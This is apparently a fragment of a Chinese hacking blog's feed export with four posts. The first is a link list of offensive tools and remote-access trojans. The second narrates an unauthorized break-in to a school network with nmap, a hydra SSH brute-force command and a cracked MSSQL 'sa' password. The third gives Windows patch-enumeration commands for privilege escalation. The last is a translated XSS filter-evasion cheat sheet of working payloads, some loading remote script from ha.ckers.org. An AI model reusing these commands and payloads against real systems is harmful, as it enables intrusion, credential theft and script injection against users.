http命令行客户端：https://github.com/jkbrzt/httpie 浏览器调试利器：https://github.com/firebug/firebug DISCUZ漏洞扫描器：https://github.com/code-scan/dzscan 自动化代码审计工具https://github.com/wufeifei/cobra 浏览器攻击框架：https://github.com/julienbedard/browsersploit tomcat自动后门部署：https://github.com/mgeeky/tomcatWarDeployer 网络空间指纹扫描器：https://github.com/nanshihui/Scan-T burpsuit之J2EE扫描插件：https://github.com/ilmila/J2EEScan windows域渗透工具：mimikatz明文注入：https://github.com/gentilkiwi/mimikatz Powershell渗透库合集：https://github.com/PowerShellMafia/PowerSploit Powershell tools合集：https://github.com/clymb3r/PowerShell powershell的mimikittenz:https://github.com/putterpanda/mimikittenz 域渗透教程:https://github.com/l3m0n/pentest_study Fuzz:Web向Fuzz工具https://github.com/xmendez/wfuzz HTTP暴力破解，撞库攻击脚本https://github.com/lijiejie/htpwdScan 漏洞利用及攻击框架：msf框架：https://github.com/rapid7/metasploit-framework pocsscan攻击框架：https://github.com/erevus-cn/pocscan Pocsuite攻击框架:https://github.com/knownsec/Pocsuite Beebeeto攻击框架：https://github.com/n0tr00t/Beebeeto-framework 漏洞POC&amp;EXP:ExploitDB官方git版本:https://github.com/offensive-security/exploit-database php漏洞代码分析：https://github.com/80vul/phpcodz CVE-2016-2107:https://github.com/FiloSottile/CVE-2016-2107 CVE-2015-7547 POC：https://github.com/fjserna/CVE-2015-7547 JAVA反序列化POC生成工具:https://github.com/frohoff/ysoserial JAVA反序列化EXP:https://github.com/foxglovesec/JavaUnserializeExploits Jenkins CommonCollections EXP:https://github.com/CaledoniaProject/jenkins-cli-exploit CVE-2015-2426 EXP (windows内核提权):https://github.com/vlad902/hacking-team-windows-kernel-lpe use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):https://github.com/hxer/vulnapp php7缓存覆写漏洞Demo及相关工具:https://github.com/GoSecure/php7-opcache-override XcodeGhost木马样本:https://github.com/XcodeGhostSource/XcodeGhost 中间人攻击及钓鱼中间人攻击框架:https://github.com/secretsquirrel/the-backdoor-factory https://github.com/secretsquirrel/BDFProxy https://github.com/byt3bl33d3r/MITMf Inject code, jam wifi, and spy on wifi users:https://github.com/DanMcInerney/LANs.py 中间人代理工具:https://github.com/intrepidusgroup/mallory wifi钓鱼:https://github.com/sophron/wifiphisher 密码破解：密码破解工具:https://github.com/shinnok/johnny 本地存储的各类密码提取利器:https://github.com/AlessandroZ/LaZagne 二进制及代码分析工具：二进制分析工具https://github.com/devttys0/binwalk 系统扫描器https://github.com/quarkslab/binmap rp:https://github.com/0vercl0k/rp Windows Exploit Development工具https://github.com/lillypad/badger 二进制静态分析工具（python）:https://github.com/bdcht/amoco Python Exploit Development Assistance for GDB:https://github.com/longld/peda 对BillGates Linux Botnet系木马活动的监控工具https://github.com/ValdikSS/billgates-botnet-tracker 木马配置参数提取工具:https://github.com/kevthehermit/RATDecoders Shellphish编写的二进制分析工具（CTF向）:https://github.com/angr/angr 针对python的静态代码分析工具:https://github.com/yinwang0/pysonar2 一个自动化的脚本（shell）分析工具，用来给出警告和建议:https://github.com/koalaman/shellcheck 基于AST变换的简易Javascript反混淆辅助工具:https://github.com/ChiChou/etacsufbo EXP编写框架及工具：二进制EXP编写工具:https://github.com/t00sh/rop-tool CTF Pwn 类题目脚本编写框架:https://github.com/Gallopsled/pwntools an easy-to-use io library for pwning development:https://github.com/zTrix/zio 跨平台注入工具:https://github.com/frida/frida 哈希长度扩展攻击EXP：https://github.com/citronneur/rdpy 隐写：隐写检测工具https://github.com/abeluck/stegdetect 各类安全资料:data_hacking合集:https://github.com/ClickSecurity/data_hacking mobile-security-wiki:https://github.com/exploitprotocol/mobile-security-wiki 书籍《reverse-engineering-for-beginners》:https://github.com/veficos/reverse-engineering-for-beginners 一些信息安全标准及设备配置:https://github.com/luyg24/IT_security APT相关笔记:https://github.com/kbandla/APTnotes Kcon资料:https://github.com/knownsec/KCon 《DO NOT FUCK WITH A HACKER》:https://github.com/citypw/DNFWAH 各类安全脑洞图：https://github.com/phith0n/Mind-Map 信息安全流程图：https://github.com/SecWiki/sec-chart/ tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428 各类CTF资源近年ctf writeup大全:https://github.com/ctfs/write-ups-2016 https://github.com/ctfs/write-ups-2015 https://github.com/ctfs/write-ups-2014 fbctf竞赛平台Demo:https://github.com/facebook/fbctf ctf Resources:https://github.com/ctfs/resources ctf及黑客资源合集:https://github.com/bt3gl/My-Gray-Hacker-Resources ctf和安全工具大合集:https://github.com/zardus/ctf-tools ctf向 python工具包https://github.com/P1kachu/v0lt 各类编程资源:大礼包（什么都有）:https://github.com/bayandin/awesome-awesomeness bash-handbook:https://github.com/denysdovhan/bash-handbook python资源大全:https://github.com/jobbole/awesome-python-cn git学习资料:https://github.com/xirong/my-git 安卓开源代码解析https://github.com/android-cn/android-open-project python框架，库，资源大合集:https://github.com/vinta/awesome-python JS 正则表达式库（用于简化构造复杂的JS正则表达式）:https://github.com/VerbalExpressions/JSVerbalExpressions Python：python 正则表达式库（用于简化构造复杂的python正则表达式）:https://github.com/VerbalExpressions/ python任务管理以及命令执行库:https://github.com/pyinvoke/invoke python exe打包库:https://github.com/pyinstaller/pyinstaller Veil-Evasion免杀项目：https://github.com/Veil-Framework/Veil-Evasion py3 爬虫框架:https://github.com/orf/cyborg 一个提供底层接口数据包编程和网络协议支持的python库:https://github.com/CoreSecurity/impacket python requests 库:https://github.com/kennethreitz/requests python 实用工具合集:https://github.com/mahmoud/boltons python爬虫系统:https://github.com/binux/pyspider 科学上网：科学上网工具https://github.com/XX-net/XX-Net 福利：微信自动抢红包动态库https://github.com/east520/AutoGetRedEnv 微信抢红包插件（安卓版）https://github.com/geeeeeeeeek/WeChatLuckyMoney hardsed神器:https://github.com/yangyangwithgnu/hardseed 甲方安全工程师生存指南web索引及日志搜索工具：https://github.com/thomaspatzke/WASE 开源日志采集器：https://github.com/wgliang/logcool 扫描CS结构的web debugerhttps://github.com/Kozea/wdb 恢复sqlite数据库删除注册信息：https://github.com/aramosf/recoversqlite/ gps欺骗检测工具:https://github.com/zxsecurity/gpsnitch 应急处置响应框架:https://github.com/biggiesmallsAG/nightHawkResponse web安全开发指南:https://github.com/FallibleInc/security-guide-for-developers 各个知名厂商漏洞测试报告模板：https://github.com/juliocesarfort/public-pentesting-reports linux下恶意代码检测包：https://github.com/rfxn/linux-malware-detect 操作系统运行指标可视化框架：https://github.com/facebook/osquery 恶意代码分析系统：https://github.com/cuckoosandbox/cuckoo 定期搜索及存储web应用：https://github.com/Netflix/Scumblr 事件响应框架：https://github.com/google/grr 综合主机监控检测平台：https://github.com/ossec/ossec-hids 分布式实时数字取证系统：https://github.com/mozilla/mig Microsoft &amp; Unix 文件系统及硬盘取证工具：https://github.com/sleuthkit/sleuthkit 蜜罐：SSH蜜罐：https://github.com/desaster/kippo 蜜罐集合资源：https://github.com/paralax/awesome-honeypots kippo进阶版蜜罐：https://github.com/micheloosterhof/cowrie SMTP 蜜罐：https://github.com/awhitehatter/mailoney web应用程序蜜罐：https://github.com/mushorg/glastopf 数据库蜜罐：https://github.com/jordan-wright/elastichoney web蜜罐：https://github.com/atiger77/Dionaea 远控：用gmail充当C&amp;C服务器的后门https://github.com/byt3bl33d3r/gcat 开源的远控：https://github.com/UbbeLoL/uRAT c#远控：https://github.com/hussein-aitlahcen/BlackHole]]></content>
      <tags>
        <tag>资料</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【旧】记一次突破校园定时断网及免费上网]]></title>
    <url>%2F%E3%80%90%E6%97%A7%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AA%81%E7%A0%B4%E6%A0%A1%E5%9B%AD%E5%AE%9A%E6%97%B6%E6%96%AD%E7%BD%91%E5%8F%8A%E5%85%8D%E8%B4%B9%E4%B8%8A%E7%BD%91%20%2F</url>
    <content type="text"><![CDATA[一篇以前写文章，无意间又翻到因此传上来分享 前言首先在宿舍访问学校内网需要在路由器断开ppoe拨号，并切换成动态IP方式才可以正常访问。根据学校机房所在的位置，断网情况只存在宿舍区域推测内网的服务器是不会受断网影响。所以如果我能拿到内网服务器不仅能够突破11.40的断网说不定还能整个大学生涯免费上网， 想想都有点小激动。 信息搜集首先用nmap扫描内网B段 12nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml 192.168.1.1/16 65536个IP地址中有266个存活，排除本机所在的C段证明只有一个段是公共区域可以访问的，也就是学校的内网web服务器，先直接使用nmap扫描C段 1sudo namp -sS -sV -O -Pn 192.168.200.1/24 扫描后发现常见的135 139 445端口均被过滤 4899与3306也惨遭沦陷，根据扫描结果与测试后得知以下情况1.已知校园服务器网段为192.168.200.1/242.常见端口均被过滤，仅幸存21,22,23,80,14333.且已验证每台开放web服务的服务器上都装有企业版360与网站卫士所以我思路是打算目前放弃开放web服务的服务器（等大神放0day）从21，22和1433上找出口哦不找弱口令，把开放相关端口的IP整理好。 意大利炮！开火！1.FTP匿名登录无果（好像扫出来了没什么用） 2.ssh爆破 1hydra -M /home/guoker/22ip.txt -l root -P /home/guoker/Blasting_dictionary/top100password.txt -vV ssh 3. mssql爆破192.168.200.148 sa 123456aa 嘿嘿 文末msf 然后就是cmd加账号开3389，我就不截图了。 关于Windows2003单网卡搭建VPN 有兴趣的小伙伴可以自行百度下。到这儿文章就已经结束了，其他东西也不在本文多叙述 关于下集的内网渗透我会在联系学校修复后，抽个时间写写。Thanks]]></content>
      <tags>
        <tag>校园</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows补丁信息查询利用方法]]></title>
    <url>%2FWindows%E8%A1%A5%E4%B8%81%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[t00ls上看到的回复，make 获取补丁信息：wmic qfe get Caption,Description,HotFixID,InstalledOn 也可以修改命令查看特定漏洞补丁信息： 1wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3136041" /C:"KB4018483" 也可以用脚本啊： Metasploit：post/windows/gather/ Windows Exploit Suggester：https://github.com/GDSSecurity/Windows-Exploit-Suggester Sherlock：https://github.com/rasta-mouse/Sherlock]]></content>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【转载】XSS Filter Evasion Cheat Sheet 中文版]]></title>
    <url>%2F%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91XSS%20Filter%20Evasion%20Cheat%20Sheet%20%E4%B8%AD%E6%96%87%E7%89%88%2F</url>
    <content type="text"><![CDATA[XSS Filter Evasion Cheat Sheet 中文版译者注：翻译本文的最初原因是当我自己看到这篇文章后，觉得它是非常的价值。但是这么著名的一个备忘录却一直没有人把它翻译成中文版。很多人仅仅是简单的把文中的各种代码复制下来，然后看起来很刁的发在各种论坛上，不过你要真去认真研读这些代码，就会完全不知所云了。原因是这篇文章最精华的部分是代码的解释而非代码本身。 一方面为了自己学习，一方面也想让更多国内的xss爱好者去更方便的阅读本文。所以虽然我本身英语很烂，xss技术也很烂，但还是去翻译了这篇文章。当然这也导致最后翻译出来的文章晦涩难懂、不知所云。这个真心向大家说声抱歉啊，也希望大家能及时帮忙提出文中的翻译错误或其他错误。 另外，在翻译过程中，我发现XSS Filter Evasion Cheat Sheet原版本身也存在一些技术上的或是描述上的错误。不过虽然我知道原文中某些地方可能出错，但是我也不知道正确的应该是什么样的，还有就是或许原文本身是对的，但是我理解错了。种种原因吧，最后基本上都按原文在翻译，有些觉得可能存在错误的地方或是我理解不了的地方，我就没有翻译，继续使用英文。希望大家可以帮忙给出翻译或是解释。 如果大家有能力阅读英文的话，尽量阅读原文，即使要看这个翻译版，也配合英文版一起看。不要让我的翻译错误误人子弟啊。最后希望大家可以和我一起解决翻译中的各种错误，把这个中文版维护好。 谢谢 源文档地址：https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet 翻译文档github地址：https://github.com/caomulaodao/XSS-Filter-Evasion-Cheat-Sheet-CN #介绍这篇文章的主要目的是去给应用安全测试者提供一份xss漏洞检测指南。文章的初始内容由RSnake提供给OWASP，从他的xss备忘录: http://ha.ckers.org/xss.html 。目前这个网页已经重定向到我们这里，我们打算维护和完善它。OWASP的第一个防御备忘录项目：the XSS (Cross Site Scripting) Prevention Cheat Sheet灵感来源于RSnake的 XSS Cheat Sheet，所以我们对他给予我们的启发表示感谢。我们想要去创建短小简单的参考给开发者去帮助他们预防xss漏洞，而不是创建一个复杂的备忘录去简单的告诉他们需要去预防各种千奇百怪的攻击。所以，OWASP备忘录系列诞生了。 #测试这个备忘录主要针对那些已经理解了最基本的xss攻击，但是想要深入理解各种过滤器绕过的细微差别的学习者。 请注意大部分的xss攻击向量已经在其代码下方给出了测试过的浏览器列表。 xss 探测器注入下面这些代码，在大多数没有特殊xss向量要求而易遭受脚本攻击的地方将会弹出单词“xss”。使用url编码器去编码你的整个代码。小技巧：如果你是急切的需要快去检测一个页面，通常只需要注入轻量的 “&lt;任意字符&gt;” 标签，然后判断输出点是否受到干扰就可以判断是否xss漏洞了。 &apos;;alert(String.fromCharCode(88,83,83))//&apos;;alert(String.fromCharCode(88,83,83))//&quot;; alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//-- &gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt; xss 探测器2如果你没有充足的输入空间去检测页面是否存在xss漏洞。下面这段代码是一个好的简洁的xss注入检测代码。在注入这段代码后，查看页面源代码寻找是否存在看起来像 &lt;XSS verses &lt;XSS这样的输出点从而判断是否存在xss漏洞。 &apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()} 无过滤绕过这是一个常规的xss注入代码，虽然通常它会被防御，但是我们建议首先去尝试它。（引号是不被需要的在任何现代浏览器中，因此这里省略了它。） &lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt; 通过javascript指令实现的图片xss图片xss依靠javascript指令实现。（IE7.0不支持javascript指令在图片上下文中，但是可以在其他上下文触发。下面的例子展示了一种其他标签依旧通用的原理。） &lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; 无引号无分号&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt; 不区分大小写的xss攻击向量&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt; html 实体The semicolons are required for this to work: &lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt; 重音符混淆如果你的javascript代码中需要同时使用单引号和双引号，那么可以使用重音符（`）来包裹javascript代码。它也经常会非常有用因为xss过滤代码未考虑到这个字符。 &lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt; 畸形的A标签跳过href属性，而直接获取xss实质攻击代码…提出被David Cross ~ 已验证在chrome浏览器 &lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt; 此外，chrome浏览器喜欢去补全缺失的引号为你。如果你遇到阻碍那么直接省略它们吧，chrome将会正确的帮你补全缺失的引号在URL和script中。 &lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt; 畸形的IMG标签最早被 Begeek发现（可以短小而干净的运行于任何浏览器），这个xss向量依靠松散的渲染引擎解析IMG标签中被引号包含的字符串来实现。我猜测它最初是为了正确编码而这样实现，但这样让它更加困难去解析html。 &lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt; fromCharCode如果没有任何形式的引号被允许，你可以eval()一串fromCharCode在javascript中来创建任何你需要的xss向量。 &lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt; 默认SRC属性去绕过SRC域名检测过滤器这将绕过绝大多数SRC域名过滤器。插入javascript代码在任何一个事件方法同样适用于任何一个HTML标签，例如Form、Iframe、Input、Embed等等。它也允许任何该标签的相关事件去替换，例如onblur, onclick等，后面我们会附加一个可用的事件列表。由David Cross提供，Abdullah Hussam编辑。 &lt;IMG SRC=# onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt; 默认SRC属性通过省略它的值&lt;IMG SRC= onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt; 默认SRC属性通过完全不设置它&lt;IMG onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt; 通过error事件触发alert&lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt;&lt;/img&gt; 十进制html编码引用所有在中使用javascript指令的xss示例将无法工作在 Firefox 或 Netscape 8.1+，因为它们使用了 Gecko 渲染引擎。使用 XSS Calculator 获取更多信息。 &lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40; &amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt; 结尾没有分号的十进制html编码引用它是经常有用的在绕过寻找”&#XX;”格式的xss过滤，因为大多数人不知道最多允许7位字符的编码限制。这也是有用的对那些对字符串解码像$tmp_string =~ s/.\&amp;#(\d+);./$1/; 的过滤器,它们错误的认为一个html编码必须要用;去结束。（我是无意中发现） &lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt; 结尾没有分号的十六进制html编码引用这也是一种实用的xss攻击针对上文的$tmp_string =~ s/.\&amp;#(\d+);./$1/; ，错误的认为数字编码跟随在#后面（十六进制htnl编码并非如此），。使用 XSS Calculator 获取更多信息。 &lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt; 内嵌TAB用来分开xss攻击代码 &lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt; 内嵌被编码的TAB用来分开xss攻击代码 &lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt; 内嵌换行符去分开xss代码一些网站声称09-13编码的所有字符（十进制）都可以实现这种形式的攻击。这是不正确的。只有09(tab), 10 (换行) 和 13 (回车)可以使用。你可以查看ascii表为更详细的信息。下面四个xss例子展示了这个向量。 &lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt; 编码回车符去分开xss代码注意：上面我编写的三个xss字符串比必须长度的字符串更长，原因是0可以被省略。通常我看到的过滤器假设十六进制和十进制的编码是两到三个字符，正确的应该是一到七个字符。 &lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt; 没有分割的javascript指令null字符也可以作为一个xss向量，但不同于上面。你需要直接注入它们利用一些工具例如Burp Proxy，或是使用 %00 在你的url字符串里。或者如果你想写你自己的注入工具你可以使用vim（^V^@ 会生成null），以及用下面的程序去生成它到一个文本文件中。好吧，我再一次撒谎了。 Opera的老版本（大约 7.11 on Windows）是脆弱的对于一个额外的字符173（软连字符）。但是null字符 %00 是更加的有用或者帮助我们绕过某些真实存在的过滤器通过变动像这个例子中的。 perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out IMG中javascript之前添加空格和元字符为xss绕过xss过滤拼配模式没有考虑单词”javascript:”中可能存在空格是正确的，因为否则将无法渲染。但是这也导致了错误的假设认为你不可以有一个空格在引号和 “javascript:” 单词之间。事实上你可以插入 1-32编码字符（十进制）中的任何字符。 &lt;IMG SRC=&quot; &amp;#14; javascript:alert(&apos;XSS&apos;);&quot;&gt; 非字母数字字符的xss Firefox html解析器认为一个非数字字母的字符在一个html关键字中不是有效的，因此这些字符会被视为空白符或是无效的token在html标签之后。这导致很多xss过滤器错误的认为html标签必须是被空白符隔断的。例如，”&lt;SCRIPT\s” != “&lt;SCRIPT/XSS\s”: &lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; 和上面的原理相同，我们继续扩大，Gecko渲染引擎允许字母、数字、html封装字符以外的任何字符位于事件处理器与等号之间。借此我们可以绕过xss过滤器。注意这也是适用于重音符如下所示： &lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt; Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是在不使用空格的情况下，Gecko仅允许一个斜杠在html标签和参数之间。这可能是有用的在那些不允许输入空格的系统中。 &lt;SCRIPT/SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; 额外的开括号 Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，因为这些引擎通过拼配最早出现的一对尖括号，并且提取其内部内容作为标签，而没有使用更加有效的算法例如 Boyer-Moore（寻找打开的尖括号以及相关标签的模糊拼配）。最后，代码中的双斜杠可以抑制额外尖括号导致的javascript错误。 &lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt; 没关闭的script标签对于使用了 Gecko渲染引擎的Firefox 和 Netscape 8.1 ，你并不需要常规xss中”&gt;&#x3C;&#x2F;&#x53;&#x43;&#x52;&#x49;&#x50;&#x54;&#x3E;”这部分。 Firefox会帮你闭合标签，并且加入结束标签。多么的体贴啊！ Unlike the next one, which doesn’t effect Firefox, this does not require any additional HTML below it. 如果需要，你可以加入引号，但通常他并不是必须的。注意，我并不清楚这个代码被注入后html代码会闭合成什么样子。 &lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt; B &gt; script标签中的协议解析这个特殊的变体由 Łukasz Pilorz 提出，并且基于上文中 Ozh提出的协议解析绕过。这个xss例子工作在 IE, 使用IE渲染引擎的Netscape 以及加了在结尾的 Opera。这是非常有用的在输入长度受到限制。域名越短越好。 “.j”是有效的，不需要考虑编码问题因为浏览拿起可以自动识别在一个script标签中。 &lt;SCRIPT SRC=//ha.ckers.org/.j&gt; 半开的HTML/JavaScript xss向量不同于 Firefox ，ie渲染引擎不会加入额外的数据到你的页面。但是它允许javascript指令在IMG标签中，这是有用的作为一个xss向量，因为它不需要一个结束的尖括号。你可以使用这个xss向量在任何html标签中，甚至没有用”&gt;”闭合标签。 A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/ because it doesn’t require the end “&gt;”. 它也是有效的去对付真实的xss过滤器，我曾经用半开的&lt;IFRAME 标签替代 &lt;IMG 标签去绕过过滤器。 &lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot; 双开尖括号使用一个开始尖括号(&lt;)在向量结尾代替一个关闭尖括号（&gt;）会有不同的影响在 Netscape Gecko 的渲染中。 Without it, Firefox will work but Netscape won’t。 &lt;iframe src=http://ha.ckers.org/scriptlet.html &lt; 转义javascript中的转义当一个应用程序是输出用户自定义的信息到javascript代码中时，例如： &#x3C;SCRIPT&gt;var a=”$ENV{QUERY_STRING}”;&#x3C;/SCRIPT&gt;。如果你想插入你自己的javascript代码进入它，但是服务器转义了其中的某些引号，这时你需要通过再转义被转义的字符来绕过它。因此使最终的输入代码类似于&#x3C;SCRIPT&gt;var a=”\“;alert(‘XSS’);//“;&#x3C;/SCRIPT&gt; 。最终\转义了双引号前被服务器添加的\，从而使双引号不会被转义，因此触发xss向量。xss定位器使用这个方法。 \&quot;;alert(&apos;XSS&apos;);// 闭合title标签这是一个简单的xss向量，可以引入一个恶意的xss攻击。译者注：titile标签内部不支持html代码，所有内容会被自动转义为普通字符。 &lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt; INPUT image&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; BODY image&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt; IMG DYNSRC(视频剪辑)&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt; IMG lowsrc（低分辨率图片）&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt; List-style-image&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt; List-style-image为符号列表嵌入自定义图片的符号。它是只能工作在ie渲染引擎因为使用了javascript指令。这不是一个特别有用的xss向量。 &lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt; VBscript in an image&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt; Livescript (仅适用于老版本的Netscape)&lt;IMG SRC=&quot;livescript:[code]&quot;&gt; BODY 标签这个方法不需要使用任何”javascript:” 或 “&lt;SCRIPT…” 的变体去实现xss攻击。Dan Crowley特别指出你可以额外的加入一个空格在等号之前(“onload=” != “onload =”): &lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt; 事件处理程序它可以被用于上文中的一些共性xss攻击（这是最完整的一个实时更新的在线列表）。感谢Rene Ledosquet 的更新。此外你可以参考 Dottoro Web Reference 或是 events in JavaScript. FSCommand() (攻击者可以使用它当执行一个嵌入的flash对象时) onAbort() (当使用者终止一张正在载入的图片) onActivate() (当对象被被设置为激活元素) onAfterPrint() (用户打印或是预览打印工作后激活) onAfterUpdate() (激活在一个数据对象当源对象数据更新后) onBeforeActivate() (当对象被被设置为激活元素时触发) onBeforeCopy() (攻击者执行攻击代码在一个选区被复制到剪贴板之前-攻击者也可以实现它通过execCommand(“Copy”)函数。) onBeforeCut() (攻击者执行攻击代码在在一个选区被剪贴。) onBeforeDeactivate() (当激活元素被改变后触发) onBeforeEditFocus() (触发在一个可被编辑的元素内的对象当其处于一个 UI-activated状态或是一个可被编辑对象被选择之前) onBeforePaste() (用户需要被欺骗执行粘贴或是去触发它通过execCommand(“Paste”)函数。) onBeforePrint() (用户需要被欺骗执行打印或是攻击者可以使用print()或是execCommand(“Print”)函数。) onBeforeUnload() (用户需要被欺骗关闭浏览器-攻击者不可以 unload windows除非它是被执行从其父窗口。) onBeforeUpdate() (激活在数据对象在源对象更新数据之后。) onBegin() (onbegin 事件被立即触发当元素的声明周期开始后) onBlur() (当失去焦点时触发) onBounce() (触发当选框对象的behavior属性被设置为”alternate”或是选框的内容抵达窗口的一边。) onCellChange() (触发当数据改变在数据provider) onChange() (select, text, or TEXTAREA 字段失去焦点或是它们的值是被改变。) onClick()(点击事件) onContextMenu() (用户需要右击在攻击攻击区域) onControlSelect() (当用户去控制一个选择对象时触发。) onCopy() (用户需要去copy某些东西或是利用execCommand(“Copy”)命令) onCut() (用户需要copy某些东西或是利用execCommand(“Cut”) 命令) onDataAvailable() (用户改变数据在某个元素上或是攻击者可以执行相同的函数。) onDataSetChanged() (当源数据对象被改变时触发) onDataSetComplete() (触发当数据是成功获取到从数据源对象) onDblClick() (用户双击某个元素。) onDeactivate() (当当前元素失去激活状态时触发) onDrag() (需要用户拖动某个对象) onDragEnd() (需要用户拖动某个对象) onDragLeave() (需要用户拖动某个对象从一个有效的位置。) onDragEnter() (需要用户拖动某个对象从一个有效的位置。) onDragOver() (需要用户拖动某个对象从一个有效的位置。) onDragDrop() (用户拖动某个对象（例如文件）到浏览器窗口内。) onDragStart() (当用户开始拖动操作时发生。) onDrop() (用户拖动某个对象（例如文件）到浏览器窗口内。) onEnd() (当生命周期结束时触发） onError() (载入document 或 image发生错误时触发) onErrorUpdate() (当更新数据源的相关对象时发生错误则触发) onFilterChange() (当一个滤镜完成状态改变时触发) onFinish() (移动的Marquee文字完成一次移动时触发) onFocus() (当窗口获得焦点时攻击者可以执行代码) onFocusIn() (当窗口获得焦点时攻击者可以执行代码) onFocusOut() (当窗口失去焦点时攻击者可以执行代码) onHashChange() (当当前地址的hash发生改变时触发) onHelp() (当用户在当前窗口点击F1时触发攻击代码) onInput() (可编辑元素中的内容被用户改变后出发) onKeyDown() (用户按下一个键) onKeyPress() (用户点击或是按下一个键) onKeyUp() (用户释放一个键) onLayoutComplete() (用户需要去打印或是打印预览) onLoad() (攻击者执行攻击代码在窗口载入后) onLoseCapture() (可以被触发被releaseCapture() 方法) onMediaComplete() (当波翻改一个流媒体文件时，这个事件将触发在文件开始播放前。) onMediaError() (当用户打开的页面包含一个媒体文件，并且发生错误时触发) onMessage() (当文档对象接受到一个信息时触发) onMouseDown() (攻击者需要让用户去点击一张图片。) onMouseEnter() (光标移入一个对象或是区域) onMouseLeave() (攻击者需要让用户移动光标进入一个图片或是表格，接着再次移出) onMouseMove() (攻击者需要让用户移动鼠标进入一个图片或是表格上) onMouseOver() (光标移到一个对象或是区域上) onMouseUp() (攻击者需要让用户点击一张图片) onMouseWheel() (攻击者需要让用户去使用他们的鼠标滚轮) onMove() 